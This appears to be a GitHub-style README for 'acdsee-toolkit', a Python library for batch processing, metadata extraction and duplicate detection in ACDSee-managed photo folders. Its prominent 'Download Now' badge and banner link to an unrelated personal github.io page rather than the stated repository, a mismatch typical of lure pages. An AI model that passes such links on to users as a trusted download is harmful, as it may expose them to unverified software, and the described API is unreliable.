# acdsee-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://chamthjayanaka.github.io/acdsee-docs-l2r/)


[![Banner](banner.png)](https://chamthjayanaka.github.io/acdsee-docs-l2r/)


[![PyPI version](https://badge.fury.io/py/acdsee-toolkit.svg)](https://badge.fury.io/py/acdsee-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Tests](https://img.shields.io/badge/tests-passing-brightgreen.svg)](https://github.com/acdsee-toolkit/acdsee-toolkit/actions)

A Python toolkit for automating image workflows, extracting metadata, and processing image libraries managed with **ACDSee Free for Windows**. Designed for developers and power users who want to integrate ACDSee Free's lightweight image management capabilities into scripted pipelines.

ACDSee Free is a popular lightweight image viewer for Windows, and this toolkit bridges the gap between its file organization conventions and Python-based data processing workflows.

---

## ✨ Features

- 📁 **Library Scanning** — Recursively scan and index image directories organized by ACDSee Free
- 🏷️ **Metadata Extraction** — Read EXIF, IPTC, and XMP metadata from image files in bulk
- 🔄 **Batch Processing** — Automate renaming, sorting, and format conversion across large image collections
- 📊 **Data Analysis** — Generate reports and statistics from your image library (file types, sizes, date ranges)
- 🗂️ **Category Parsing** — Parse and work with ACDSee-style category and keyword tag structures
- 🖼️ **Thumbnail Generation** — Programmatically generate thumbnail previews for any image set
- 📤 **Export Pipelines** — Build automated export workflows with configurable output profiles
- 🔍 **Duplicate Detection** — Identify duplicate or near-duplicate images using perceptual hashing

---

## 📦 Installation

### From PyPI

```bash
pip install acdsee-toolkit
```

### From Source

```bash
git clone https://github.com/acdsee-toolkit/acdsee-toolkit.git
cd acdsee-toolkit
pip install -e ".[dev]"
```

### With Optional Dependencies

```bash
# For advanced image analysis features
pip install acdsee-toolkit[analysis]

# For full development environment
pip install acdsee-toolkit[dev]
```

---

## 🚀 Quick Start

```python
from acdsee_toolkit import LibraryScanner, MetadataExtractor

# Point the scanner at your ACDSee-managed image folder
scanner = LibraryScanner(root_dir="C:/Users/YourName/Pictures")

# Build an index of all images in the directory tree
library = scanner.build_index()

print(f"Found {len(library)} images across {library.folder_count} folders")

# Extract metadata from the first image
extractor = MetadataExtractor()
meta = extractor.extract(library.images[0].path)

print(f"Camera: {meta.exif.get('Make')} {meta.exif.get('Model')}")
print(f"Taken:  {meta.exif.get('DateTimeOriginal')}")
```

---

## 📖 Usage Examples

### Scanning and Indexing an Image Library

```python
from acdsee_toolkit import LibraryScanner
from acdsee_toolkit.filters import ExtensionFilter

scanner = LibraryScanner(
    root_dir="D:/Photography/2024",
    filters=[ExtensionFilter(["jpg", "jpeg", "png", "tiff", "bmp"])]
)

library = scanner.build_index(recursive=True)

for folder in library.folders:
    print(f"{folder.path} — {folder.image_count} images ({folder.total_size_mb:.1f} MB)")
```

---

### Bulk Metadata Extraction

```python
from acdsee_toolkit import LibraryScanner, MetadataExtractor
import pandas as pd

scanner = LibraryScanner(root_dir="C:/Pictures")
library = scanner.build_index()

extractor = MetadataExtractor(include_fields=["Make", "Model", "DateTimeOriginal", "GPSInfo"])

records = []
for image in library.images:
    meta = extractor.extract(image.path)
    records.append({
        "filename": image.filename,
        "camera_make": meta.exif.get("Make", "Unknown"),
        "camera_model": meta.exif.get("Model", "Unknown"),
        "date_taken": meta.exif.get("DateTimeOriginal"),
        "has_gps": meta.has_gps,
        "file_size_kb": image.size_kb,
    })

df = pd.DataFrame(records)
df.to_csv("image_library_report.csv", index=False)
print(df.describe())
```

---

### Batch Rename and Sort

```python
from acdsee_toolkit.processors import BatchRenamer, DateSorter

renamer = BatchRenamer(
    source_dir="C:/Pictures/Unsorted",
    pattern="{date:%Y-%m-%d}_{index:04d}{ext}",   # e.g. 2024-06-15_0001.jpg
    dry_run=True  # Preview changes before applying
)

plan = renamer.plan()
for operation in plan.operations[:5]:
    print(f"  {operation.source_name}  →  {operation.target_name}")

# Apply once satisfied with the plan
plan.execute()

# Sort into dated subfolders (compatible with ACDSee Free folder conventions)
sorter = DateSorter(
    source_dir="C:/Pictures/Unsorted",
    dest_dir="C:/Pictures/Sorted",
    folder_format="%Y/%m-%B"   # e.g. 2024/06-June
)
sorter.run()
```

---

### Duplicate Image Detection

```python
from acdsee_toolkit.analysis import DuplicateFinder

finder = DuplicateFinder(
    directory="D:/Photos",
    method="phash",        # Perceptual hash — tolerates minor edits/resizes
    threshold=8            # Hamming distance threshold (lower = stricter)
)

duplicate_groups = finder.find()

print(f"Found {len(duplicate_groups)} groups of duplicates\n")
for i, group in enumerate(duplicate_groups, 1):
    print(f"Group {i}:")
    for img in group:
        print(f"  {img.path}  ({img.size_kb} KB)")
```

---

### Generating Thumbnails

```python
from acdsee_toolkit.processors import ThumbnailGenerator

gen = ThumbnailGenerator(
    source_dir="C:/Pictures/Events",
    output_dir="C:/Pictures/Thumbnails",
    size=(256, 256),
    format="JPEG",
    quality=85
)

result = gen.run()
print(f"Generated {result.success_count} thumbnails in {result.elapsed:.2f}s")
print(f"Skipped {result.skip_count} already-processed files")
```

---

### Library Statistics Report

```python
from acdsee_toolkit import LibraryScanner
from acdsee_toolkit.analysis import LibraryStats

scanner = LibraryScanner(root_dir="C:/Pictures")
library = scanner.build_index()

stats = LibraryStats(library)
report = stats.generate()

print(report.summary())
# Output:
# ─────────────────────────────────────────
# ACDSee Toolkit — Library Report
# ─────────────────────────────────────────
# Total images    : 14,302
# Total size      : 47.3 GB
# Unique cameras  : 6
# Date range      : 2018-03-11 → 2024-11-28
# Top extension   : .jpg (78.4%)
# Folders scanned : 312
# ─────────────────────────────────────────
```

---

## 🧩 Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | ≥ 3.8 | 3.10+ recommended |
| Pillow | ≥ 9.0 | Core image processing |
| piexif | ≥ 1.1.3 | EXIF read/write support |
| imagehash | ≥ 4.3 | Perceptual hashing (duplicate detection) |
| tqdm | ≥ 4.60 | Progress bars for batch operations |
| pandas | ≥ 1.4 | Optional — for report export |
| numpy | ≥ 1.22 | Optional — for analysis features |

> **Platform note:** Core scanning and metadata features work on Windows, macOS, and Linux. Some path-handling utilities are optimized for Windows environments where ACDSee Free is typically installed.

---

## 🗂️ Project Structure

```
acdsee-toolkit/
├── acdsee_toolkit/
│   ├── __init__.py
│   ├── scanner.py          # LibraryScanner, ImageIndex
│   ├── metadata.py         # MetadataExtractor, ExifData
│   ├── processors/
│   │   ├── batch_rename.py
│   │   ├── date_sorter.py
│   │   └── thumbnails.py
│   └── analysis/
│       ├── duplicates.py
│       └── stats.py
├── tests/
│   ├── test_scanner.py
│   ├── test_metadata.py
│   └── test_processors.py
├── docs/
├── pyproject.toml
└── README.md
```

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. **Fork** the repository and create a feature branch
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Install** development dependencies
   ```bash
   pip install -e ".[dev]"
   ```

3. **Write tests** for any new functionality
   ```bash
   pytest tests/ -v
   ```

4. **Lint** your code before submitting
   ```bash
   black acdsee_toolkit/
   flake8 acdsee_toolkit/
   ```

5. Open a **Pull Request** with a clear description of your changes

Please review our [CONTRIBUTING.md](CONTRIBUTING.md) and [Code of Conduct](CODE_OF_CONDUCT.md) before getting started.

---

## 📝 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for full details.

---

## 🔗 Related

- [ACDSee Free for Windows](https://www.acdsee.com/) — the lightweight image viewer this toolkit is designed to complement
- [Pillow Documentation](https://pillow.readthedocs.io/) — the imaging library powering core features
- [piexif](https://piexif.readthedocs.io/) — EXIF data handling

---

*acdsee-toolkit is an independent open-source project and is not affiliated with or endorsed by ACD Systems International Inc.*